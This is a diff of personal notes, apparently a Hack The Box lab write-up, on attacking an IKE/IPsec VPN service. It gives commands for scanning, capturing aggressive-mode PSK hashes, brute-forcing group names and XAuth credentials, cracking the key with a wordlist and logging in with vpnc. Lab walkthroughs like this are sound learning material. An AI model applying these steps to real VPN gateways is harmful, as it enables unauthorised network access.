@@ -4,12 +4,12 @@ banner:
 publish: false
 ---
 ```
-nmap -p- -sV -sC 10.129.1.173
+nmap -p- -sV -sC 10.129.1.232
 ```
 
 UDP scan too!!!
 ```
-nmap -sU -T4 10.129.1.173
+nmap -sU -T4 10.129.1.232
 ```
 # Box info
 ports:
@@ -44,6 +44,8 @@ the default IKE port is 500/udp
 The fact IKE is present on this machine probably means it’s a vpn server.
 
 ## Abusing IKE
+
+### Initial info
 Running [ike-scan](https://www.kali.org/tools/ike-scan/) to get more info out of the service.
 
 ```
@@ -59,8 +61,9 @@ Ending ike-scan 1.9.6: 1 hosts scanned in 0.028 seconds.
 
 Following [this informative guide](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting), it seems that `1 returned handshake; 0 returned notify` means that the target is configured for IKE negotiations and we can propose *transforms* to the server. Transforms are configurations like the one sent in the code block.
 
+### Getting vendor
 ```bash
-ike-scan -M --showbackoff 10.129.1.173
+ike-scan -M --showbackoff 10.129.1.232
 ```
 Running this will give us back the machine vendor by analysing the time between received messages.
 
@@ -68,13 +71,15 @@ The implementation guess is: Linksys Etherafast
 ![[Vault-data/Attachments/9 Expressway - Easy box.png]]
 looking sharp
 
+### Stealing the handshake key
 Intercepting the hash by running agressive(`-A`) mode and cracking the pre-shared key output (`-P`).
 ```
-ike-scan -P -M -A -n fakeID 10.129.1.173
+ike-scan -P -M -A -n fakeID 10.129.1.232
 ```
 
 In this case, a fake id was specified(`-n`) and there was still a hash given back, which means fake hashes are sent with fake ID’s (something modern versions do). Brute-forcing the ID and hash aren’t possible in this case.
 
+### Bruteforcing the group name
 Using [this list](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) to bruteforce the group name using common group names.
 
 ``` bash
@@ -98,27 +103,58 @@ Running this yielded a number of IDS that seemed to work:
 - DefaultWEBVPNGroup
 - Ezvpn
 - EZVPN
-…a long list, you get it
+…a long list, you get it. To verify i will use another package.
 
-tried [iker.py](https://github.com/isaudits/scripts/blob/master/iker.py) to see if that gave the same output.
+Setting up a whole python 2 environment so i can run [ikeforce](https://github.com/SpiderLabs/ikeforce). 
+Don’t forget to install a specific version of `pyopenssl`: ``pip install 'pyopenssl==17.2.0'``
+
+Needs to be ran with `sudo`, otherwise it wont work
 ```bash
-sudo python ./iker.py 10.129.1.173 -c /usr/share/wordlists/external/SecLists/Misc/ike-groupid.txt
+sudo -E env PATH=$PATH python ./ikeforce.py 10.129.1.232 -a -s 1
+```
+Outputs transform: 5 2 1 2
+
+```bash
+sudo -E env PATH=$PATH python ./ikeforce.py 10.129.238.52 -e -w ./wordlists/groupnames.dic -t 5 2 1 2
 ```
 
-Both iker and [Ikeforce](https://github.com/SpiderLabs/ikeforce) dont seem to work for different reasons.
+`no matching enumeration technique available for this device`…oof…i guess the long list will do
 
-I’ll just assume those group names works.
+### Stealing the handshake key pt. 2
 
 ```bash
-ike-scan -M -A -n GroupVPN --pskcrack=hash.txt 10.129.1.173
+ike-scan -M -A -n GroupVPN --pskcrack=hash.txt 10.129.1.232
 ```
+
+It also says an id is ID_USER_FQDN and ike@expressway.htb
 
 ```
 psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-Outputted key: freakingrockstarontheroad
+Outputted pre shared key: freakingrockstarontheroad
 
 Seems legit.
 
-Now we need to capture the login details using `fiked`.
+### Stealing XAuth login creds
+```
+sudo -E env PATH=$PATH python ./ikeforce.py 10.129.238.52 -a -u admin -w /usr/share/wordlists/rockyou.txt -t 5 2 1 2 --id=ike@expressway.htb
+```
+
+## Loggin into the vpn
+
+as root:
+```bash
+cat > /etc/vpnc/samplevpn.conf << STOP
+IPSec gateway 10.129.238.52
+IPSec ID ike@expressway.htb
+IPSec secret freakingrockstarontheroad
+IKE Authmode psk
+STOP
+```
+
+and start the vpn…
+```bash
+sudo vpnc samplevpn
+ifconfig ton0
+```
